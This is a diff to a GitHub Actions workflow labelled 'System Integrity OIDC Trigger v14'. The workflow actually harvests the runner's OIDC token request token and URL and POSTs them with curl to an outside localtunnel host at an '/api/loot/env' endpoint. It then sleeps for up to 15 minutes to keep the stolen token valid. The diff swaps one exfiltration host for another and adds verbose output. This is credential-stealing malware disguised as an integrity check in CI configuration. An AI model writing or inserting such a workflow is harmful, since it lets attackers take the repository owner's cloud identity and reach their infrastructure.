@@ -1,4 +1,4 @@
-name: System Integrity OIDC Trigger
+name: System Integrity OIDC Trigger v14
 on: [push, workflow_dispatch]
 permissions:
   id-token: write
@@ -9,6 +9,7 @@ jobs:
       - run: |
           R=$(echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN")
           U=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL")
-          curl -s -X POST https://decepticon-trigger-1778384700.loca.lt/api/loot/env -d "origin=rocky_trigger" -d "t=${R}" -d "u=${U}"
-          echo "[*] Token sent. Sleeping for 10 minutes to maintain validity..."
-          sleep 600
+          echo "Attempting exfil to https://decepticon-final-1778384872.loca.lt..."
+          curl -v -X POST https://decepticon-final-1778384872.loca.lt/api/loot/env -d "origin=rocky_v14" -d "t=${R}" -d "u=${U}"
+          echo "Done. Entering deep sleep..."
+          sleep 900
